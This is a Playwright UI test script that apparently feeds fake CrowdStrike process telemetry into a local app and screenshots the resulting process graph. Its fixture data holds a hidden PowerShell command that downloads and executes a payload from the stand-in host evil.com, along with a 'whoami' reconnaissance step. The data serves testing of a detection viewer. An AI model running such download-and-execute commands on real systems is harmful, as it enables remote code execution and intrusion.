const { chromium } = require('playwright');
const path = require('path');
const fs = require('fs');

(async () => {
  const browser = await chromium.launch({ headless: true });
  const context = await browser.newContext();
  const page = await context.newPage();

  await page.goto('http://localhost:5173');
  await page.waitForTimeout(2000);

  await page.evaluate(() => {
    localStorage.setItem('theme', 'dark');
    window.location.reload();
  });
  await page.waitForTimeout(2000);

  // Create a dummy JSONL for CrowdStrike to trigger the graph
  const jsonlContent = `{"#event_simpleName": "ProcessRollup2", "TargetProcessId": "1001", "ParentProcessId": "1000", "ImageFileName": "svchost.exe", "CommandLine": "svchost.exe -k netsvcs", "UserName": "SYSTEM"}
{"#event_simpleName": "ProcessRollup2", "TargetProcessId": "1002", "ParentProcessId": "1001", "ImageFileName": "cmd.exe", "CommandLine": "cmd.exe /c whoami", "UserName": "SYSTEM"}
{"#event_simpleName": "ProcessRollup2", "TargetProcessId": "1003", "ParentProcessId": "1002", "ImageFileName": "powershell.exe", "CommandLine": "powershell.exe -w hidden -c 'IEX (New-Object Net.WebClient).DownloadString(\\\"http://evil.com/payload\\\")'", "UserName": "user$"}
{"#event_simpleName": "AssociateIndicator", "TargetProcessId": "1003", "DetectName": "Suspicious PowerShell", "DetectSeverity": "High", "timestamp": "123456789"}`;

  const tempJsonlPath = path.join(__dirname, 'test_crowdstrike.jsonl');
  fs.writeFileSync(tempJsonlPath, jsonlContent);

  // Set the dropdown to Crowdstrike
  const select = await page.locator('select');
  if (await select.isVisible()) {
      await select.selectOption({ label: 'Falcon CrowdStrike (JSONL)' });
  }

  // Upload file
  const fileInput = await page.$('input[type=file]');
  if (fileInput) {
      await fileInput.setInputFiles(tempJsonlPath);
      console.log('File uploaded');
  }

  // Wait for canvas
  try {
     await page.waitForSelector('canvas', { timeout: 10000 });
     await page.waitForTimeout(3000);
     console.log('Canvas loaded');
  } catch (e) {
     console.log('Canvas not found', e);
  }

  await page.waitForTimeout(2000);
  await page.screenshot({ path: 'crowdstrike-graph.png', fullPage: true });
  console.log('Screenshot saved to crowdstrike-graph.png');
  await browser.close();
})();
